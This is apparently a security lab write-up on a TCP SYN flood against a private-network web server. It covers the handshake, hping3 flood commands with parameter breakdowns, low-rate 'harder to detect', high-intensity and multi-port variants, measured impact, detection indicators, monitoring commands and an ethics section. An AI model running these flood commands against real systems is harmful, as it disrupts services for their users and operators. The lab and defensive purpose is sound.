# Attack Documentation

## TCP SYN Flood Attack Overview

This document explains the TCP SYN flood attack implementation used in this lab.

## Attack Mechanism

### TCP Three-Way Handshake (Normal)
```
Client                    Server
  |                         |
  |-------- SYN ----------->|  (Client requests connection)
  |                         |
  |<------ SYN-ACK ---------|  (Server acknowledges and responds)
  |                         |
  |-------- ACK ----------->|  (Client confirms connection)
  |                         |
  [CONNECTION ESTABLISHED]
```

### TCP SYN Flood Attack
```
Attacker                  Server
  |                         |
  |-------- SYN ----------->|  (Attacker sends SYN)
  |                         |  [Server allocates resources]
  |<------ SYN-ACK ---------|  (Server responds)
  |                         |
  |         ...             |  (Attacker never sends ACK)
  |                         |  [Server waits, resources tied up]
  |-------- SYN ----------->|  (Attacker sends more SYNs)
  |-------- SYN ----------->|
  |-------- SYN ----------->|
  |         ...             |
  [SERVER CONNECTION TABLE FULL]
```

## Attack Parameters

### hping3 Command Breakdown
```bash
sudo hping3 -S -c 10000 --flood -I u100 -p 80 192.168.153.129
```

| Parameter | Description | Purpose |
|-----------|-------------|---------|
| `-S` | Send SYN packets | Initiates TCP connection requests |
| `-c 10000` | Packet count | Sends 10,000 packets total |
| `--flood` | Send packets as fast as possible | Maximizes attack intensity |
| `-I u100` | Interval of 100 microseconds | Controls packet rate (~10K/sec) |
| `-p 80` | Target port | Attacks HTTP web service |
| `192.168.153.129` | Target IP | Ubuntu server address |

## Attack Effectiveness

### Resource Exhaustion

The attack exploits the server's connection table by:

1. **Creating incomplete connections** - Each SYN packet creates a half-open connection
2. **Exhausting memory** - Server allocates resources for each pending connection
3. **Filling connection table** - Limited number of concurrent connections allowed
4. **Blocking legitimate users** - No slots available for real connections

### Measured Impact

Based on testing results:

- **Baseline Performance:** 5,487 requests/second
- **Under Attack:** 2,600 requests/second
- **Performance Degradation:** 52.6%
- **Attack Success Rate:** Significant service disruption without complete outage

## Attack Variations

### 1. Low-Rate Attack
```bash
sudo hping3 -S -c 1000 -i u1000 -p 80 192.168.153.129
```
- Slower packet rate
- Harder to detect
- Less immediate impact

### 2. High-Intensity Attack
```bash
sudo hping3 -S --flood -p 80 192.168.153.129
```
- Maximum packet rate
- Quickly exhausts resources
- Easily detected

### 3. Multi-Port Attack
```bash
# Attack multiple services simultaneously
sudo hping3 -S --flood -p 80,443,22 192.168.153.129
```

## Detection Indicators

### Network Indicators
- High volume of SYN packets
- Low volume of corresponding ACK packets
- Many connections in SYN_RECEIVED state
- Unusual traffic patterns from single source

### System Indicators
- Connection table near capacity
- Increased CPU usage
- Memory consumption rising
- Slow response to legitimate requests

### Monitoring Commands

**Check connection states:**
```bash
netstat -ant | grep SYN_RECV | wc -l
```

**Monitor packet drops:**
```bash
sudo iptables -L -n -v
```

**Watch system resources:**
```bash
htop
```

## MITRE ATT&CK Mapping

**Technique:** T1499.002 - Endpoint Denial of Service: Service Exhaustion Flood

**Tactic:** Impact

**Description:** Attackers flood the target with SYN packets to exhaust connection resources, making the service unavailable to legitimate users.

## Ethical Considerations

### Legal Requirements
- ✅ Written authorization required
- ✅ Testing scope clearly defined
- ✅ Isolated environment mandatory
- ✅ No internet connectivity

### Best Practices
- Document all testing activities
- Maintain audit logs
- Follow incident response procedures
- Report findings responsibly

## References

- [RFC 793 - Transmission Control Protocol](https://tools.ietf.org/html/rfc793)
- [MITRE ATT&CK T1499.002](https://attack.mitre.org/techniques/T1499/002/)
- [hping3 Official Documentation](http://www.hping.org/)
